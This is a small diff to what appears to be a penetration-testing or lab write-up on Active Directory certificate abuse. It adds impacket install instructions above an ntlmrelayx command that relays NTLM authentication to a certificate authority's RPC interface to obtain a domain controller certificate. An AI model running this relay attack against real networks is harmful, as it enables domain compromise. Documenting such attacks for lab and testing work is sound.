@@ -1100,6 +1100,13 @@ Certificate Templates                   : [!] Could not find any certificate tem
 
 ### Exploitation
 
+installed with uv to avoid an error
+
+
+```
+uv tool install impacket --force --with 'pyOpenSSL<25'
+```
+
 
 ```shell
 sudo proxychains ~/.local/bin/ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController
